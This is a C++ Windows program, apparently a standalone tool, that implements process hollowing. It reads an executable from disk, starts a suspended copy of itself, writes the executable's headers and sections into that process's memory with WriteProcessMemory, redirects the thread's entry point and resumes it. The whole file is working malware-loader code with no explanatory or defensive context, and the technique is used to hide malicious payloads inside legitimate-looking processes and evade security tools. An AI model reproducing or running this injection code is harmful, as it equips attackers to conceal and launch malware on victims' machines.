#include<Windows.h>
#include<stdio.h>
void hollowing(BYTE* data) {
	IMAGE_DOS_HEADER* DOSheader;
	IMAGE_NT_HEADERS* NTheader;
	IMAGE_SECTION_HEADER* SECheader;

	PROCESS_INFORMATION pinfo = { 0 };
	STARTUPINFOA sinfo = { 0 };
	//	sinfo.cb = sizeof(STARTUPINFOA);
	CONTEXT* context;

	DWORD imageBase;
	void* pimageBase;

	DOSheader = (PIMAGE_DOS_HEADER)data;
	NTheader = (PIMAGE_NT_HEADERS)((DWORD)data + DOSheader->e_lfanew);

	char FileName[128] = { 0 };
	GetModuleFileNameA(NULL, FileName, 128);

	if (CreateProcessA(FileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo)) {
		context = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
		context->ContextFlags = CONTEXT_FULL;
		if (GetThreadContext(pinfo.hThread, context)) {
			ReadProcessMemory(pinfo.hProcess, (void*)(context->Ebx + 8), &imageBase, 4, NULL);
			pimageBase = VirtualAllocEx(pinfo.hProcess, (void*)(NTheader->OptionalHeader.ImageBase),
				NTheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pimageBase != NULL) {
				WriteProcessMemory(pinfo.hProcess, pimageBase, data, NTheader->OptionalHeader.SizeOfHeaders,
					NULL);
				for (int section = 0; section < NTheader->FileHeader.NumberOfSections; section += 1) {
					SECheader = (PIMAGE_SECTION_HEADER)((DWORD)data + DOSheader->e_lfanew + 248 + 40 * section);
					WriteProcessMemory(pinfo.hProcess, (PVOID)((DWORD)pimageBase + SECheader->VirtualAddress),
						(PVOID)((DWORD)data + SECheader->PointerToRawData), SECheader->SizeOfRawData, NULL);
				}
				WriteProcessMemory(pinfo.hProcess, (void*)(context->Ebx + 8), (void*)(&NTheader->OptionalHeader.ImageBase), 4, NULL);
				context->Eax = (DWORD)pimageBase + NTheader->OptionalHeader.AddressOfEntryPoint;
				if (!SetThreadContext(pinfo.hThread, context)) {
					printf("%d", GetLastError());
					TerminateProcess(pinfo.hProcess, 0);
				}
				else
					ResumeThread(pinfo.hThread);
			}
		}
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hThread);
		CloseHandle(pinfo.hProcess);
	}
}
int main(int argc, char** argv) {
	if (argc != 2) {
		printf("Usage : \"Process Hollowing.exe\" [exe file]\n");
		return 1;
	}
	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Cannot open file\n");
		return 1;
	}
	DWORD size = GetFileSize(hFile, NULL);
	BYTE* data = new BYTE[size + 1];
	memset(data, 0, size + 1);

	ReadFile(hFile, data, size, NULL, NULL);
	CloseHandle(hFile);
	hollowing(data);
	delete data;
}